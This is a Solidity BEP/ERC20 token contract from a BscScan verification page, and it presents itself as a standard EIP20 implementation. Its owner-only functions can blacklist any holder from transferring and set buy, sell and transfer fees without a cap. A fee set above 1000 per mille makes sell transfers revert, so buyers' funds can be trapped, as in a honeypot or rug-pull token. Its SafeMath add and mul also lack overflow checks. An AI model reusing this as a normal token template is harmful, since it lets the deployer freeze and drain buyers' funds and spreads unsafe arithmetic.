/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-25
*/

/*
Implements EIP20 token standard: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md
.*/


pragma solidity ^0.4.21;
contract EIP20Interface {
    uint256 public totalSupply;
    function balanceOf(address _owner) public view returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public view returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a+b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, 'sub');
        return a-b;
    }   
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        
        return a*b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, 'div');
        return (a - (a % b)) / b;
    }    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, 'mod');
        return a % b;
    }
}


contract EIP20 is EIP20Interface {
    using SafeMath for uint256;
    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    string public name;
    uint8 public decimals;                
    string public symbol;
    address owner;
    mapping(address => uint256)  private _limitAddressMap;  
    mapping(address => bool) private isMarketPair;  
    uint256 public _buyFee = 130;
    uint256 public _sellFee = 130;
    uint256 public _transferFee = 20;
    address public _feeAddress = address(0);
    address public _destroyAddress = address(0);
    constructor(
        uint256 _initialAmount,
        string _tokenName,
        uint8 _decimalUnits,
        string _tokenSymbol
    ) public {
        balances[msg.sender] = _initialAmount;            
        totalSupply = _initialAmount;                       
        name = _tokenName;                                 
        decimals = _decimalUnits;                         
        symbol = _tokenSymbol;  
        owner = msg.sender;                           
    }
    modifier checkOwner() {
        require(msg.sender == owner, "invalid operation");
        _;
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        _transfer(msg.sender,_to,_value);
        return true;
    }
    function _transfer(address _sender, address _to, uint256 _value) private {
        require(_limitAddressMap[_sender] != 1, "transfer is limit"); 
        uint256 finalAmount = takeFee(_sender, _to, _value);
        balances[_sender] = balances[_sender].sub(_value);
        balances[_to] = balances[_to].add(finalAmount);
        emit Transfer(_sender, _to, finalAmount); 
    }
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketPair[sender]) { 
            feeAmount = amount.mul(_buyFee).div(1000);
            _takeFee(recipient,_feeAddress, feeAmount);
        }else if(isMarketPair[recipient]) { 
            feeAmount = amount.mul(_sellFee).div(1000);
            _takeFee(recipient,_feeAddress, feeAmount);
        }else{
            feeAmount = amount.mul(_transferFee).div(1000);
            _takeFee(recipient,_destroyAddress, feeAmount);
        }
        return amount.sub(feeAmount);
    }
    function _takeFee(address sender, address recipient,uint256 tAmount) private {
        if (tAmount == 0 ) return;
        balances[recipient] = balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        _transfer(_from,_to,_value);
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); //solhint-disable-line indent, no-unused-vars
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    function setLimitAddressMap(address _a,uint256 _t) public checkOwner
    {
        _limitAddressMap[_a] = _t;
    }
    function setMarketPair(address _a, bool _t) public checkOwner {
        isMarketPair[_a] = _t;
    }
    function setFeeAddress(address _a, address _b) public checkOwner {
        _feeAddress = _a;
        _destroyAddress = _b;
    }
    function setOwner(address _s) checkOwner public {
        owner = _s;
    }
    function setFee(uint256 _s, uint256 _s1, uint256 _s2) checkOwner public {
        _buyFee = _s;
        _sellFee = _s1;
        _transferFee = _s2;
    }
}